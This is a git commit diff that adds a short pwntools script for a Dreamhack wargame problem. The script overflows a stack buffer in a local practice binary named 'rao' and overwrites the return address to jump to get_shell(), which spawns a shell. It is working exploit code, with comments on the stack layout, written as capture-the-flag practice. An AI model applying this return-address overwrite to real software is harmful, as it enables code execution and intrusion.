7abe6265f50ab147c488c92b146a9d92f4b98b31
Brian <hibrian827@gmail.com>
2024-01-05 00:13:37 +0900

    added problem

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,4 +1,14 @@
-import requests
+from pwn import *          # Import pwntools module
 
-port = 9157
-url_index = f"http://host3.dreamhack.games:{port}/"
+p = process('./rao')       # Spawn process './rao'
+
+elf = ELF('./rao')
+get_shell = elf.symbols['get_shell']       # The address of get_shell()
+
+payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
+payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
+payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'
+
+p.sendline(payload)        # Send payload to './rao'
+
+p.interactive()   
